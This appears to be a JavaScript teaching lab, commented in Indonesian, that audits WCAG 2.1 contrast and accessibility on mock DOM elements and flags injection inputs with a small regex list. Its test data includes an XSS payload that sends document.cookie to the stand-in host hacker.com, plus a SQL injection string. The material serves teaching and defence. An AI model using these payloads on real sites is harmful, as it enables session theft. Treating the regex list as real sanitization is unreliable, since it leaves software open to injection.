/**
 * Hands-on M02: Accessibility (A11y) WCAG 2.1 AA DOM Auditor & Contrast Calculator Simulator
 * 
 * Demonstrasi Otomasi Audit Non-Fungsional:
 * 1. Penghitung Rasio Kontras Warna Matematis (WCAG 2.1 Formula).
 * 2. Auditor Semantik Elemen Antarmuka (Images, Form Labels, Buttons vs Clickable Divs).
 * 3. Detektor Sanitasi Input Keamanan Dasar (XSS Injeksi Payloads).
 */

const ANSI = {
  reset: "\x1b[0m",
  green: "\x1b[32m",
  red: "\x1b[31m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  bold: "\x1b[1m",
  dim: "\x1b[2m"
};

// ==========================================
// 1. COLOR CONTRAST RATIO CALCULATOR (WCAG 2.1)
// ==========================================
function hexToRgb(hex) {
  const clean = hex.replace("#", "");
  const num = parseInt(clean, 16);
  return {
    r: (num >> 16) & 255,
    g: (num >> 8) & 255,
    b: num & 255
  };
}

function getLuminance({ r, g, b }) {
  const [rs, gs, bs] = [r, g, b].map(val => {
    const s = val / 255;
    return s <= 0.03928 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4);
  });
  return 0.2126 * rs + 0.7152 * gs + 0.0722 * bs;
}

function calculateContrastRatio(hexColor1, hexColor2) {
  const lum1 = getLuminance(hexToRgb(hexColor1));
  const lum2 = getLuminance(hexToRgb(hexColor2));
  const brightest = Math.max(lum1, lum2);
  const darkest = Math.min(lum1, lum2);
  const ratio = (brightest + 0.05) / (darkest + 0.05);
  return Number(ratio.toFixed(2));
}

// ==========================================
// 2. DOM ACCESSIBILITY AUDITOR
// ==========================================
class AccessibilityAuditor {
  constructor() {
    this.violations = [];
    this.passes = [];
  }

  auditImage(element) {
    if (element.alt === undefined) {
      this.violations.push({
        rule: "WCAG 1.1.1 Non-text Content (Level A)",
        element: `<img src="${element.src}">`,
        message: "Elemen gambar wajib memiliki atribut 'alt'. Jika dekoratif, gunakan alt=\"\"."
      });
    } else if (element.alt.trim().length === 0 && !element.isDecorative) {
      this.violations.push({
        rule: "WCAG 1.1.1 Non-text Content",
        element: `<img src="${element.src}" alt="">`,
        message: "Alt text kosong pada gambar yang bukan dekoratif."
      });
    } else {
      this.passes.push(`Image '${element.src}' memiliki alt text: "${element.alt}"`);
    }
  }

  auditFormInput(inputElement, allElements) {
    // Periksa apakah ada <label for="inputId"> atau aria-label
    const hasExplicitLabel = allElements.some(
      el => el.tag === "label" && el.for === inputElement.id
    );
    const hasAriaLabel = !!inputElement["aria-label"];

    if (!hasExplicitLabel && !hasAriaLabel) {
      this.violations.push({
        rule: "WCAG 1.3.1 Info and Relationships & WCAG 3.3.2 Labels (Level A)",
        element: `<input id="${inputElement.id}" type="${inputElement.type}" placeholder="${inputElement.placeholder || ''}">`,
        message: "Input form tidak memiliki elemen <label for> atau atribut 'aria-label' yang terhubung."
      });
    } else {
      this.passes.push(`Input #${inputElement.id} memiliki label pendamping yang valid.`);
    }
  }

  auditClickableElement(element) {
    if (element.tag !== "button" && element.tag !== "a" && element.hasClickListener) {
      this.violations.push({
        rule: "WCAG 4.1.2 Name, Role, Value (Level A)",
        element: `<${element.tag} class="${element.class}">`,
        message: `Komponen interaktif menggunakan tag non-semantik <${element.tag}> bukan <button>. Keyboard navigation & screen reader akan gagal.`
      });
    } else if (element.tag === "button") {
      this.passes.push(`Tombol menggunakan elemen semantik native <button>.`);
    }
  }

  auditContrast(textColor, bgColor, isLargeText = false) {
    const ratio = calculateContrastRatio(textColor, bgColor);
    const minRequired = isLargeText ? 3.0 : 4.5;

    if (ratio < minRequired) {
      this.violations.push({
        rule: `WCAG 1.4.3 Contrast (Minimum) (Level AA)`,
        element: `Text: ${textColor} on Background: ${bgColor}`,
        message: `Rasio kontras ${ratio}:1 di bawah batas minimum ${minRequired}:1.`
      });
    } else {
      this.passes.push(`Kontras warna ${textColor} pada ${bgColor} memenuhi syarat: ${ratio}:1 (>= ${minRequired}:1)`);
    }
  }
}

// ==========================================
// 3. SECURITY INPUT SANITIZER AUDITOR
// ==========================================
function auditInputSecurity(inputString) {
  const dangerousPatterns = [
    /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
    /javascript:/gi,
    /onerror\s*=/gi,
    /onload\s*=/gi,
    /'\s*OR\s*'1'\s*=\s*'1/gi
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(inputString)) {
      return {
        isSafe: false,
        flaggedPattern: pattern.toString(),
        risk: "Potential XSS / Injection Payload Detected"
      };
    }
  }
  return { isSafe: true };
}

// ==========================================
// 4. MAIN SIMULATION EXECUTION
// ==========================================
function main() {
  console.log(`${ANSI.bold}╔═══════════════════════════════════════════════════════════════╗`);
  console.log(`║   NON-FUNCTIONAL AUDITOR: WCAG 2.1 AA & SECURITY LAB RUNNER   ║`);
  console.log(`╚═══════════════════════════════════════════════════════════════╝${ANSI.reset}`);

  const auditor = new AccessibilityAuditor();

  // Mock DOM Elements dari Halaman Web yang Diuji
  const mockDOM = [
    { tag: "img", src: "/assets/banner.jpg", alt: "Promo Diskon Akhir Tahun 50% untuk Semua Produk Elektronik" },
    { tag: "img", src: "/assets/broken-logo.png" }, // Missing alt!
    { tag: "label", for: "email_input", text: "Alamat Email Anda" },
    { tag: "input", id: "email_input", type: "email", placeholder: "nama@domain.com" },
    { tag: "input", id: "password_input", type: "password", placeholder: "Kata Sandi" }, // Missing label!
    { tag: "div", class: "btn-checkout", hasClickListener: true }, // Div as button!
    { tag: "button", class: "btn-pay", hasClickListener: true }
  ];

  console.log(`\n${ANSI.bold}${ANSI.cyan}=== 1. MENJALANKAN AUDIT AKSESIBILITAS DOM ===${ANSI.reset}`);
  for (const el of mockDOM) {
    if (el.tag === "img") auditor.auditImage(el);
    if (el.tag === "input") auditor.auditFormInput(el, mockDOM);
    if (el.hasClickListener) auditor.auditClickableElement(el);
  }

  console.log(`\n${ANSI.bold}${ANSI.cyan}=== 2. MENJALANKAN AUDIT RASIO KONTRAS WARNA ===${ANSI.reset}`);
  // Kasus 1: Teks abu-abu muda di atas putih (Umum gagal)
  auditor.auditContrast("#A0A0A0", "#FFFFFF", false);
  // Kasus 2: Teks abu-abu gelap terstandarisasi di atas putih (Lolos)
  auditor.auditContrast("#2D3748", "#FFFFFF", false);
  // Kasus 3: Tombol biru dengan teks putih (Lolos)
  auditor.auditContrast("#FFFFFF", "#1E40AF", false);

  // Print Hasil Audit Aksesibilitas
  console.log(`\n${ANSI.bold}HASIL PEMERIKSAAN KEPATUHAN WCAG 2.1 AA:${ANSI.reset}`);
  for (const p of auditor.passes) {
    console.log(`  ${ANSI.green}✓ PASS${ANSI.reset} ${p}`);
  }

  console.log("");
  for (const v of auditor.violations) {
    console.log(`  ${ANSI.red}✗ VIOLATION${ANSI.reset} [${v.rule}]`);
    console.log(`    Target : ${ANSI.dim}${v.element}${ANSI.reset}`);
    console.log(`    Catatan: ${ANSI.yellow}${v.message}${ANSI.reset}`);
  }

  console.log(`\n${ANSI.bold}${ANSI.cyan}=== 3. AUDIT KEAMANAN INPUT SANITIZATION (SECURITY QA) ===${ANSI.reset}`);
  const testInputs = [
    { label: "Normal Name", payload: "Budi Santoso" },
    { label: "XSS Script Tag", payload: "<script>alert('Stealing Cookies!')</script>" },
    { label: "XSS Img Onerror", payload: "<img src=x onerror=fetch('http://hacker.com?c='+document.cookie)>" },
    { label: "SQL Injection", payload: "' OR '1'='1" }
  ];

  for (const test of testInputs) {
    const secResult = auditInputSecurity(test.payload);
    if (secResult.isSafe) {
      console.log(`  ${ANSI.green}✓ SAFE${ANSI.reset} [${test.label}]: "${test.payload}" lolos validasi.`);
    } else {
      console.log(`  ${ANSI.red}🚨 THREAT DETECTED${ANSI.reset} [${test.label}]: Payload berbahaya terdeteksi!`);
      console.log(`    Pola : ${ANSI.dim}${secResult.flaggedPattern}${ANSI.reset}`);
    }
  }

  console.log(`\n${ANSI.bold}--------------------------------------------------${ANSI.reset}`);
  console.log(
    `Audit Summary: ${ANSI.green}${auditor.passes.length} Lulus${ANSI.reset} | ` +
    `${auditor.violations.length > 0 ? ANSI.red : ANSI.green}${auditor.violations.length} Pelanggaran WCAG${ANSI.reset}`
  );
  console.log(`\n${ANSI.green}✓ Non-Functional Lab completed successfully!${ANSI.reset}\n`);
}

main();
